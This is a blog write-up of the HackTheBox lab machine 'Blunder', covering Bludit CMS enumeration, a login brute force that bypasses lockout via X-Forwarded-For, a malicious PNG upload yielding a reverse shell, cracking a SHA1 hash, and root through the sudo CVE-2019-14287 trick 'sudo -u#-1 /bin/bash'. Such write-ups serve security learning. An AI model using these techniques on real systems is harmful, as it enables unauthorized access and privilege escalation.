---
layout: post
title: HackTheBox - Blunder
date: 2021-01-20 17:37:00 +0100
tags: [HackTheBox]
image: /assets/img/htb/machines/linux/easy/blunder/Blunder.png
---

## Enumeration

### `nmap` scan

{% highlight bash %}
$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Blunder-full-port-scan.txt 10.10.10.191
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
{% endhighlight %}

### Apache/2.4.41 (port 80)

![Apache 2.4.41](/assets/img/htb/machines/linux/easy/blunder/80.png)

#### `gobuster`

{% highlight bash %}
$  gobuster dir -u http://$TARGET/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x .txt
#...
/0 (Status: 200)
/LICENSE (Status: 200)
/about (Status: 200)
/admin (Status: 301)
/cgi-bin/ (Status: 301)
/robots.txt (Status: 200)
/todo.txt (Status: 200)
#...
{% endhighlight %}

#### `/todo.txt`

![todo.txt](/assets/img/htb/machines/linux/easy/blunder/80-todo.png)

We identified a potential user: `fergus`

#### `/admin` (BLUDIT)

On `/admin` we can see there is a [Bludit](https://www.bludit.com/) (CMS) login page:

![Bludit](/assets/img/htb/machines/linux/easy/blunder/80-admin-bludit.png)

Looking at HTML source code, I found that:

![Bludit version](/assets/img/htb/machines/linux/easy/blunder/80-bludit-version.png)

I assumed that **Bludit**'s version was `3.9.2`: 

#### searchsploit

There are some exploits against Bludit:

![searchsploit](/assets/img/htb/machines/linux/easy/blunder/searchsploit.png)

`multiple/webapps/48701.txt` allows us to obtain a reverse shell but it requires authentification.

`php/webapps/48942.py` can be used to bypass brute force protection.

## Foothold

### CeWL - Custom Word List generator

Using a cool tool named `cewl`, we can generate a custom wordlist based on website keywords:

{% highlight bash %}
$ cewl http://10.10.10.191/ > cewl-wordlist.txt
{% endhighlight %}

![cewl](/assets/img/htb/machines/linux/easy/blunder/cewl.png)

### 48942.py - Bludit Auth Bruteforce Bypass

I copied `/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt` as `users.txt` and I added `fergus` to this wordlist .

Then I ran `48942.py`: 

{% highlight bash %}
$  python3 48942.py -l http://10.10.10.191/admin/login.php -u users.txt -p cewl-wordlist.txt
{% endhighlight %}

> The trick part of this bruteforce protection bypass is the HTTP header `X-FORWARDED-FOR` as explained in [Bludit Brute Force Mitigation Bypass](https://rastating.github.io/bludit-brute-force-mitigation-bypass/).

SUCCESS! The password of `fergus` is `RolandDeschain`:

![SUCCESS](/assets/img/htb/machines/linux/easy/blunder/SUCCESS.png)

### 48701.py - Directory Traversal

`multiple/webapps/48701.txt` comes with a python script that need some parameters:
- target URL
- a valid username
- a valid password
- a malicious PNG image containing PHP code with reverse shell (we can use `msfvenom`)
- an `.htaccess` file with specifics instructions  

![48701.py](/assets/img/htb/machines/linux/easy/blunder/48701.png)

### Reverse shell

Then we have to visit [http://10.10.10.191/bl-content/tmp/temp/evil.png](http://10.10.10.191/bl-content/tmp/temp/evil.png) and we got a shell:

![reverse-shell](/assets/img/htb/machines/linux/easy/blunder/reverse-shell.png)

> I used `msfvenom` to generate `evil.png` in the first place, but finally I replaced it with [tiny PHP/bash reverse shell](https://gist.github.com/rshipp/eee36684db07d234c1cc) because I couldn't upgrade my shell using `msfvenom` solution.

After getting a shell, I executed `linpeas.sh` and I saw a potential password in `/var/www/bludit-3.10.0a/bl-content/databases/users.php`:

![password](/assets/img/htb/machines/linux/easy/blunder/DB_PASS.png)

{% highlight php %}
$ cat /var/www/bludit-3.10.0a/bl-content/databases/users.php    
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
{% endhighlight %}

It is a hexadecimal string of length 40 so it's certainly a hash and not a password!

![SHA1](/assets/img/htb/machines/linux/easy/blunder/SHA1.png)

### `hashcat` rule based attack

Let's try to crack it via `hashcat`:

{% highlight bash %}
$ echo -n "faca404fd5c0a31cf1897b823c695c85cffeb98d" > hash.txt 
$ hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
#...
faca404fd5c0a31cf1897b823c695c85cffeb98d:Password120
#...
{% endhighlight %}

> We could also use [md5decrypt.net](https://md5decrypt.net/en/Sha1/).

## User (hugo)

We can log in as `hugo` with the password we just found: `Password120`.

{% highlight bash %}
www-data@blunder:/tmp$ su hugo
Password: Password120
hugo@blunder:~$ id
uid=1001(hugo) gid=1001(hugo) groups=1001(hugo)
hugo@blunder:~$ cat user.txt
4136078049bf0679491413a880cb1b42
hugo@blunder:~$ sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
{% endhighlight %}

`sudo`'s version is `1.8.25` is vulnerable to `CVE-2019-14287` that could allow privilege escalation, even though the configuration explicitly disallows this.

The vulnerability affects all Sudo versions prior to the latest released version `1.8.28`.

![sudo version](/assets/img/htb/machines/linux/easy/blunder/sudo.png)

![google search](/assets/img/htb/machines/linux/easy/blunder/google.png)

![attack scenario](/assets/img/htb/machines/linux/easy/blunder/root-hacking.png)

## Privesc to root

{% highlight bash %}
hugo@blunder:~$ sudo -u#-1 /bin/bash
sudo -u#-1 /bin/bash
Password: Password120
root@blunder:/home/hugo# cat /root/root.txt
cat /root/root.txt
dc6cb3733fe01dafef1eecfc147f56eb
{% endhighlight %}

___

## Useful links

- [Bludit Brute Force Mitigation Bypass](https://rastating.github.io/bludit-brute-force-mitigation-bypass/)
- [CVE-2019-17240 - Bludit bypass a brute-force protection](https://nvd.nist.gov/vuln/detail/CVE-2019-17240)
- [CVE-2019-16113 - Bludit remote code execution](https://nvd.nist.gov/vuln/detail/CVE-2019-16113)
- [Rule-based Attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
- [sudo 1.8.27 - Security Bypass](https://www.exploit-db.com/exploits/47502)
- [CVE-2019-14287 - sudo underflow](https://nvd.nist.gov/vuln/detail/CVE-2019-14287)
- [Sudo Flaw Lets Linux Users Run Commands As Root Even When They're Restricted](https://thehackernews.com/2019/10/linux-sudo-run-as-root-flaw.html)